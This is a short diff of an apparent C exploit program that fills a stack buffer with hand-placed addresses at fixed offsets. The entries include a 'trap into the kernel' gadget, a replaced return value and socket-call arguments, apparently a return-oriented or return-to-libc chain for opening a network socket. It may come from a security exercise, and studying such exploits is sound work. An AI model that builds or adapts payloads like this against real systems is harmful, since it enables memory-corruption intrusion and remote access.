@@ -7,7 +7,7 @@
 
 int main(void)
 {
-  char bufr[200]; // address = 0xbfbf671d
+  char bufr[300]; // address = 0xbfbf671d
 
   char trap[] = "\xe5\xb6\xa9\xbb";
 
@@ -84,7 +84,7 @@ int main(void)
   // trap into the kernel
   strcpy(bufr + 223, trap); 
   // dummy val
-  strcpy(bufr + 227, "\x01\x01\x01\x01");
+  strcpy(bufr + 227, "\xc4\x40\xa7\xbb");
   // socket arg 1 -> 2
   strcpy(bufr + 231, "\x01\x01\x01\x01");
   // socket arg 2 -> 1
